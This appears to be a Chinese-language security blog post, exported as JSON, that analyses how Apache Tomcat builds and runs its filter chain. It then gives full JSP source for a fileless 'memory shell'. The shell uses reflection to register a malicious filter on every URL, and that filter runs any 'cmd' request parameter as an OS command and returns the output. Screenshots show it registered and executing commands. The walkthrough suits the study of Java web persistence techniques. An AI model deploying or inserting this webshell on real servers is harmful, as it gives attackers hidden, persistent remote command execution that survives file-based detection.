{"title":"Tomcat内存马之Filter","uid":"c18131c8f0a2bfb1f8168dcc8bb3a259","slug":"Filter内存马","date":"2021-11-09T16:18:15.000Z","updated":"2023-01-03T06:26:02.280Z","comments":true,"path":"api/articles/Filter内存马.json","keywords":null,"cover":"https://img1.imgtp.com/2022/12/30/vtGmRrRJ.jpg","content":"<h1 id=\"Tomcat内存马之Filter\"><a href=\"#Tomcat内存马之Filter\" class=\"headerlink\" title=\"Tomcat内存马之Filter\"></a>Tomcat内存马之Filter</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>关于 Filter 的知识，在前面<a href=\"../../01-JavaWeb%E5%9F%BA%E7%A1%80/2-Filter/Filter.md\">Filter</a>章节已经学习过，这里不再赘述，直接进入分析环节。</p>\n<h2 id=\"Filter流程分析\"><a href=\"#Filter流程分析\" class=\"headerlink\" title=\"Filter流程分析\"></a>Filter流程分析</h2><p>先编写一个简单的 Filter 实现类</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.servlet.study;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebFilter;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n@WebFilter(filterName &#x3D; &quot;FilterTest&quot;, urlPatterns &#x3D; &#123;&quot;&#x2F;*&quot;&#125;)\npublic class FilterTest implements Filter &#123;\n\n    public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n    &#125;\n\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n        String cmd &#x3D; servletRequest.getParameter(&quot;cmd&quot;);\n        try&#123;\n            if(cmd !&#x3D; null)&#123;\n                InputStream inputStream &#x3D; Runtime.getRuntime().exec(cmd).getInputStream();\n                ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();\n                byte[] bytes &#x3D; new byte[1024];\n                int a &#x3D; -1;\n                while((a &#x3D; inputStream.read(bytes))!&#x3D;-1)&#123;\n                    bao.write(bytes, 0, a);\n                &#125;\n                servletResponse.getWriter().write(new String(bao.toByteArray()));\n            &#125;\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n        &#x2F;&#x2F; 使下一个 Filter 能够继续执行\n        filterChain.doFilter(servletRequest,servletResponse);\n    &#125;\n\n    public void destroy() &#123;\n\n    &#125;\n&#125;</code></pre>\n\n<p>访问后带上参数执行命令<br><img src=\"https://img1.imgtp.com/2022/12/29/XaSCaZJr.png\" alt=\"image-20221031113025485.png\" title=\"image-20221031113025485.png\" /></p>\n<p>在<code>doFilter()</code>处方法打上断点，看看调用栈<br><img src=\"https://img1.imgtp.com/2022/12/29/U90IlsuV.png\" alt=\"image-20221031144738930.png\" title=\"image-20221031144738930.png\" /></p>\n<p>从<code>StandardWrapperValve#invoke()</code>方法跟起<br><img src=\"https://img1.imgtp.com/2022/12/29/aPJbl4Cx.png\" alt=\"image-20221031144936619.png\" title=\"image-20221031144936619.png\" /></p>\n<p>首先通过<code>ApplicationFilterFactory.createFilterChain()</code>方法创建了一个<code>ApplicationFilterChain</code>类型对象，跟进<code>createFilterChain()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/PvzCJB8q.png\" alt=\"image-20221031145633764.png\" title=\"image-20221031145633764.png\" /></p>\n<p>初始化了<code>ApplicationFilterChain</code>对象，继续往下走<br><img src=\"https://img1.imgtp.com/2022/12/29/IbK0GQ64.png\" alt=\"image-20221031161929404.png\" title=\"image-20221031161929404.png\" /></p>\n<p>接下来获取到了<code>StandardContext</code>类对象<code>context</code>，并通过<code>context.findFilterMaps()</code>方法拿到了<code>filterMaps</code>数组，继续往下走<br><img src=\"https://img1.imgtp.com/2022/12/29/RmXgUrPy.png\" alt=\"image-20221031162125403.png\" title=\"image-20221031162125403.png\" /></p>\n<p>在 if 条件中，请求路径和<code>filterMap</code>设置的规则进行匹配，如果满足则进入 if 条件中，接着根据<code>filterMap</code>对象中存储的<code>filter</code>名称在<code>StandardContext</code>类的<code>filterConfigs</code>寻找<code>filterConfig</code>，如果不为空则通过<code>addFilter()</code>方法添加到<code>filterChain</code>的属性中<br><img src=\"https://img1.imgtp.com/2022/12/29/ZJXmxkOv.png\" alt=\"image-20221031162208826.png\" title=\"image-20221031162208826.png\" /></p>\n<p><code>addFilter()</code>方法源码如上图所示，代码逻辑就是进行了去重、扩容并添加<code>filterConfig</code>。</p>\n<p>最后回到<code>StandardWrapperValve</code>类中往下走<br><img src=\"https://img1.imgtp.com/2022/12/29/bD5qfgQp.png\" alt=\"image-20221031151815580.png\" title=\"image-20221031151815580.png\" /></p>\n<p>跟进<code>filterChain.doFilter()</code>方法中<br><img src=\"https://img1.imgtp.com/2022/12/29/81HNFYiR.png\" alt=\"image-20221031151928083.png\" title=\"image-20221031151928083.png\" /></p>\n<p>继续跟进<code>internalDoFilter()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/hZ19vZ3j.png\" alt=\"image-20221031152051403.png\" title=\"image-20221031152051403.png\" /></p>\n<p>创建了<code>ApplicationFilterConfig</code>类对象<code>filterConfig</code>，然后通过<code>filterConfig.getFilter()</code>方法取出<code>filter</code>，接着调用<code>filter.doFilter()</code>方法，跟进后就是我们编写的恶意类<code>FilterTest</code><br><img src=\"https://img1.imgtp.com/2022/12/29/flZLN2lU.png\" alt=\"image-20221031152224431.png\" title=\"image-20221031152224431.png\" /></p>\n<p>至此步骤算是走完了，总结一下流程：</p>\n<ol>\n<li>通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化<code>ApplicationFilterChain</code>对象；<ul>\n<li>初始化空的<code>ApplicationFilterChain</code>对象；</li>\n<li>获取<code>StandardContext</code>类对象，并中<code>StandardContext</code>类对象中取出<code>FilterMaps</code>数组,<code>FilterMaps</code>数组中的<code>FilterMap</code>存储名称和匹配规则；</li>\n<li>根据<code>FilterMap</code>的名称在<code>StandardContext</code>类的<code>filterConfigs</code>中查找，如果不为空则添加到<code>filterChain</code>对象的属性中；</li>\n</ul>\n</li>\n<li>执行<code>filterChain#doFilter()</code>方法进入编写的恶意实现类<code>FilterTest</code>的<code>doFilter()</code>方法中执行代码。</li>\n</ol>\n<p>接下来再看看<code>Filter</code>的初始化加载流程，把断点打在类名处<br><img src=\"https://img1.imgtp.com/2022/12/29/6DC2XsQF.png\" alt=\"image-20221031160325554.png\" title=\"image-20221031160325554.png\" /></p>\n<p>看看调用栈<br><img src=\"https://img1.imgtp.com/2022/12/29/h70URIok.png\" alt=\"image-20221031160352961.png\" title=\"image-20221031160352961.png\" /></p>\n<p>跟进<code>filterStart()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/FkQRTgxd.png\" alt=\"image-20221031161602064.png\" title=\"image-20221031161602064.png\" /></p>\n<p>遍历 Map 对象<code>filterDefs</code>并获取到<code>entry.getValue()</code>，作为参数传入初始化的<code>ApplicationFilterConfig</code>对象<code>filterConfig</code>，然后通过<code>put()</code>方法把<code>filterConfig</code>添加到<code>filterConfigs</code>中。</p>\n<p>至此我们知道和 filter 有关的三个字段分别为：<code>filterMaps</code>、<code>filterDefs</code>和<code>filterConfigs</code></p>\n<h2 id=\"Filter内存马的实现\"><a href=\"#Filter内存马的实现\" class=\"headerlink\" title=\"Filter内存马的实现\"></a>Filter内存马的实现</h2><p>我们先总结一下这三个字段存储的内容</p>\n<h3 id=\"filterMaps\"><a href=\"#filterMaps\" class=\"headerlink\" title=\"filterMaps\"></a>filterMaps</h3><img src=\"https://img1.imgtp.com/2022/12/29/y90N49TN.png\" alt=\"image-20221031163323171.png\" title=\"image-20221031163323171.png\" />\n\n<p>可以看到在<code>filterMaps</code>中以数组的方式存储着 filter 的名称和路径映射信息，其中<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code>是必须的。</p>\n<h3 id=\"filterDefs\"><a href=\"#filterDefs\" class=\"headerlink\" title=\"filterDefs\"></a>filterDefs</h3><img src=\"https://img1.imgtp.com/2022/12/29/T3ldnZnu.png\" alt=\"image-20221031163520399.png\" title=\"image-20221031163520399.png\" />\n\n<p><code>filterDefs</code>以键值对的方式存储<code>filterDef</code>，<code>filterDef</code>为 Map 对象，value 存储着重要的<code>filter</code>、<code>filterClass</code>和<code>filterName</code>。</p>\n<h3 id=\"filterConfigs\"><a href=\"#filterConfigs\" class=\"headerlink\" title=\"filterConfigs\"></a>filterConfigs</h3><img src=\"https://img1.imgtp.com/2022/12/29/4XMHnOB4.png\" alt=\"image-20221031164103231.png\" title=\"image-20221031164103231.png\" />\n\n<p><code>filterConfigs</code>存储着当前的上下文<code>StandardContext</code>（WEB 应用），<code>filter</code>对象和<code>filterDef</code>等等信息。</p>\n<p>经过前面的分析，我们可以通过控制上述三个属性的内容达到动态添加恶意 Filter 的目的， 思路如下：</p>\n<ol>\n<li>编写恶意的 Filter 实现类；</li>\n<li>获取<code>StandardContext</code>对象；</li>\n<li>利用<code>FilterDef</code>对<code>filter</code>进行封装；</li>\n<li>创建<code>FilterMap</code>，将<code>filterName</code>和<code>urlPatterns</code>进行绑定（因为 Filter 是按照先后顺序进行调用，所以我们最好把恶意 Filter 放到最前面）</li>\n<li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li>\n</ol>\n<p>最后 Filter 内存马实现如下：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.InputStream&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.ByteArrayOutputStream&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.connector.Request&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.util.Map&quot; %&gt;&lt;%--\n  Created by dotast on 2022&#x2F;10&#x2F;31 16:51\n--%&gt;\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%!\n    class FilterTest implements Filter &#123;\n\n        public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n        &#125;\n\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n            String cmd &#x3D; servletRequest.getParameter(&quot;cmd&quot;);\n            try&#123;\n                if(cmd !&#x3D; null)&#123;\n                    InputStream inputStream &#x3D; Runtime.getRuntime().exec(cmd).getInputStream();\n                    ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();\n                    byte[] bytes &#x3D; new byte[1024];\n                    int a &#x3D; -1;\n                    while((a &#x3D; inputStream.read(bytes))!&#x3D;-1)&#123;\n                        bao.write(bytes, 0, a);\n                    &#125;\n                    servletResponse.getWriter().write(new String(bao.toByteArray()));\n                &#125;\n            &#125;catch (Exception e)&#123;\n                e.printStackTrace();\n            &#125;\n            &#x2F;&#x2F; 使下一个 Filter 能够继续执行\n            filterChain.doFilter(servletRequest,servletResponse);\n        &#125;\n\n        public void destroy() &#123;\n\n        &#125;\n    &#125;\n%&gt;\n\n&lt;%\n    String filterName &#x3D; &quot;FilterTest&quot;;\n    &#x2F;&#x2F; 获取StandardContext对象\n    Field field &#x3D; request.getClass().getDeclaredField(&quot;request&quot;);\n    field.setAccessible(true);\n    Request req &#x3D; (Request) field.get(request);\n    StandardContext standardContext &#x3D; (StandardContext) req.getContext();\n\n    &#x2F;&#x2F; 利用FilterDef对filter进行封装\n    FilterTest filterTest &#x3D; new FilterTest();\n    FilterDef filterDef &#x3D; new FilterDef();\n    filterDef.setFilter(filterTest);\n    filterDef.setFilterName(filterName);\n    filterDef.setFilterClass(filterTest.getClass().getName());\n\n    &#x2F;&#x2F; 创建FilterMap，将filterName和urlPatterns进行绑定\n    FilterMap filterMap &#x3D; new FilterMap();\n    filterMap.setFilterName(filterName);\n    filterMap.addURLPattern(&quot;&#x2F;*&quot;);\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n    standardContext.addFilterMapBefore(filterMap);\n\n    &#x2F;&#x2F; 封装filterConfig和filterDef到filterConfigs\n    Field field_filterConfigs &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);\n    field_filterConfigs.setAccessible(true);\n    Map filterConfigs &#x3D; (Map) field_filterConfigs.get(standardContext);\n\n    &#x2F;&#x2F; 利用反射创建FilterConfig，并且将filterDef和standardContext作为参数进行传入进行封装filterDe\n    Constructor constructor &#x3D; ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig applicationFilterConfig &#x3D; (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);\n\n    &#x2F;&#x2F; 添加到filterConfigs中\n    filterConfigs.put(filterName,applicationFilterConfig);\n%&gt;</code></pre>\n\n<p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src=\"https://img1.imgtp.com/2022/12/29/ZOWV64Yh.png\" alt=\"image-20221031172346671.png\" title=\"image-20221031172346671.png\" /></p>\n<p>接着访问其他路由都可以成功执行命令<br><img src=\"https://img1.imgtp.com/2022/12/29/OpIPVLbO.png\" alt=\"image-20221031172405231.png\" title=\"image-20221031172405231.png\" /></p>\n","text":"Tomcat内存马之Filter前言关于 Filter 的知识，在前面Filter章节已经学习过，这里不再赘述，直接进入分析环节。 Filter流程分析先编写一个简单的 Filter 实现类 package com.servlet.study; import javax.serv...","link":"","photos":[],"count_time":{"symbolsCount":"7.7k","symbolsTime":"7 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":3,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":3,"path":"api/tags/Java安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BFilter\"><span class=\"toc-text\">Tomcat内存马之Filter</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Filter%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90\"><span class=\"toc-text\">Filter流程分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Filter%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0\"><span class=\"toc-text\">Filter内存马的实现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#filterMaps\"><span class=\"toc-text\">filterMaps</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#filterDefs\"><span class=\"toc-text\">filterDefs</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#filterConfigs\"><span class=\"toc-text\">filterConfigs</span></a></li></ol></li></ol></li></ol>","author":{"name":"Akpigs","slug":"blog-author","avatar":"https://img1.imgtp.com/2022/12/28/m2fD4XcB.jpg","link":"/","description":"Sharp tools make good work, 玉不琢，不成器；人不学，不知道。","socials":{"github":"https://github.com/akpigs","twitter":"https://twitter.com/EmilyLe443","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://akpigs.blog.csdn.net/","juejin":"","customs":{"discord":{"icon":"/svg/discord.svg","link":"https://discord.gg/vS7yaWgW"},"bilibili":{"icon":"/svg/bilibili.svg","link":"https://www.bilibili.com"},"facebook":{"icon":"/svg/facebook.svg","link":"https://facebook.com"}}}},"mapped":true,"prev_post":{"title":"CVE-2016-4437漏洞分析","uid":"83f5599915e77d106d96bdbba8cc47db","slug":"CVE-2016-4437","date":"2021-11-09T16:18:15.000Z","updated":"2021-12-10T16:12:39.000Z","comments":true,"path":"api/articles/CVE-2016-4437.json","keywords":null,"cover":"https://img1.imgtp.com/2022/12/30/DipNUksO.jpg","text":"CVE-2016-4437漏洞分析前言CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。 影响版本：Shiro &lt; 1.2.5 漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":3,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":3,"path":"api/tags/Java安全.json"}],"author":{"name":"Akpigs","slug":"blog-author","avatar":"https://img1.imgtp.com/2022/12/28/m2fD4XcB.jpg","link":"/","description":"Sharp tools make good work, 玉不琢，不成器；人不学，不知道。","socials":{"github":"https://github.com/akpigs","twitter":"https://twitter.com/EmilyLe443","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://akpigs.blog.csdn.net/","juejin":"","customs":{"discord":{"icon":"/svg/discord.svg","link":"https://discord.gg/vS7yaWgW"},"bilibili":{"icon":"/svg/bilibili.svg","link":"https://www.bilibili.com"},"facebook":{"icon":"/svg/facebook.svg","link":"https://facebook.com"}}}}},"next_post":{"title":"主题推荐","uid":"66b65759df9f8ae35f6c9a2b2a4db094","slug":"Hexo主题推荐","date":"2021-06-22T14:28:13.000Z","updated":"2022-12-31T16:17:52.849Z","comments":true,"path":"api/articles/Hexo主题推荐.json","keywords":null,"cover":"https://img1.imgtp.com/2022/12/30/lFCFiGOy.jpg","text":"不错的Hexo主题推荐vuepress-aurora：vuepress-theme-aurora 是一款基于 Vuepress2 的博客主题，将本地 Markdown 文件解析成静态 html 页面，作为博客文章。搭配 说说，时间轴，文章分类，评论，友情链接，相册，音乐播放器 等...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"资源推荐","slug":"资源推荐","count":1,"path":"api/tags/资源推荐.json"}],"author":{"name":"Akpigs","slug":"blog-author","avatar":"https://img1.imgtp.com/2022/12/28/m2fD4XcB.jpg","link":"/","description":"Sharp tools make good work, 玉不琢，不成器；人不学，不知道。","socials":{"github":"https://github.com/akpigs","twitter":"https://twitter.com/EmilyLe443","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://akpigs.blog.csdn.net/","juejin":"","customs":{"discord":{"icon":"/svg/discord.svg","link":"https://discord.gg/vS7yaWgW"},"bilibili":{"icon":"/svg/bilibili.svg","link":"https://www.bilibili.com"},"facebook":{"icon":"/svg/facebook.svg","link":"https://facebook.com"}}}}}}